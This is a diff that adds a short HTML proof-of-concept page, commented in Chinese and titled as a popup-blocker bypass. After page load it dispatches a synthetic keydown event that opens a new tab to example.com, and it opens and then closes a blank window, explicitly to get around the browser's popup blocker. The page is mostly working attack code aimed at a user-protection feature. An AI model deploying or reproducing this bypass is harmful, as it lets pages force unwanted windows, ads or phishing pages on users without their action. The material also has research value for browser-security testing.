@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- 设置字符编码为 UTF-8 -->
+  <meta charset="utf-8">
+  <!-- 网页标题 -->
+  <title>弹出式窗口拦截绕过key downevent</title>
+</head>
+<body>
+  <!-- 定义一个包含段落的 div -->
+  <div id="myDIV">
+    <p id="demo">Test</p>
+  </div>
+  
+  <script>
+    // 定义 popFunction 函数
+    function popFunction() {
+      // 获取 id 为 "myDIV" 的元素
+      var x = document.getElementById("myDIV");
+      // 在该元素中选择 id 为 "demo" 的子元素
+      var a = x.querySelector("#demo");
+      // 创建一个键盘事件
+      var event = document.createEvent("KeyboardEvent");
+      // 初始化键盘事件，模拟按下 "a" 键并触发 Shift 键
+      event.initKeyboardEvent("keydown", true, true, document.defaultView, "a", 0, "Shift", 0);
+      // 触发事件，目标是 id 为 "demo" 的元素
+      a.dispatchEvent(event);
+    }
+
+    // 定义 onkeydown 事件处理函数
+    onkeydown = function() {
+      // 打开一个新窗口，URL 为 '//example.com/'，在新标签页中显示
+      window.open('//example.com/', '_blank', 'a');
+    }
+
+    // 定义 onkeypress 事件处理函数
+    onkeypress = function() {
+      // 打开一个空白页并立即关闭，目的是绕过弹窗拦截
+      window.open('about:blank', '_blank').close();
+    }
+
+    // 在页面加载后 100 毫秒调用 popFunction
+    setTimeout(popFunction, 100);
+  </script>
+</body>
+</html>
